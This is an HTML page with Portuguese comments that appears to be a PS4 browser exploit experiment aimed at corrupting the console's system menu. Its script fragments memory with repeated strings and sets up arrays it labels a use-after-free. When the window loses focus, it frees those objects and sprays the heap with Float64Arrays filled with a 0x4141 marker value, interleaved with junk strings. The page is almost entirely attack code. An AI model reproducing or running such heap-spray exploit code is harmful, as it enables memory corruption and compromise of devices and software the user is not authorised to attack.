<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UI Corruption Hunter</title>
</head>
<body>

<h1>UI GLITCH HUNTER</h1>
<p>Tente reproduzir a troca de nomes (func_refresh)</p>
<button onclick="runChaos()">INICIAR CAOS</button>
<div id="log">Logs...</div>

<script>
    const Log = document.getElementById('log');
    function log(txt) { Log.innerHTML += txt + "<br>"; }

    let controllers = [];
    let strings = [];

    function runChaos() {
        log("1. Enchendo memória com Strings...");
        
        // Tenta empurrar a memória da UI para perto do Heap
        try {
            for(let i=0; i<10000; i++) {
                // Cria strings grandes para fragmentar a memória
                let s = "A".repeat(100) + i; 
                strings.push(s);
            }
        } catch(e) {}

        log("2. Preparando UAF...");
        // Seu setup original que funcionou
        for(let i=0; i<5000; i++) {
            let ctrl = new Float64Array(8);
            ctrl[0] = i; 
            controllers.push(ctrl);
        }

        log(">>> APERTE OPTIONS AGORA E FIQUE OLHANDO O MENU <<<");
        
        const doc = document.documentElement;
        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.requestFullscreen) doc.requestFullscreen();

        window.onblur = function() {
            // SPRAY MISTO (Float + String)
            // Tenta acertar tanto dados quanto ponteiros de texto
            
            // 1. Libera
            controllers = null;
            strings = null; // Solta as strings também para criar buracos variados

            // 2. Spray Agressivo
            let spray = [];
            for(let i=0; i<10000; i++) {
                // Alterna entre Float e String para confundir o alocador
                if(i % 2 == 0) {
                    let f = new Float64Array(16);
                    f.fill(2.121995791e-314); // 0x4141...
                    spray.push(f);
                } else {
                    // Tenta injetar lixo onde deveria ter texto
                    spray.push("FUNC_CORRUPT_" + i); 
                }
            }
            log("Spray concluído. Verifique o menu.");
        };
    }
</script>
</body>
</html>
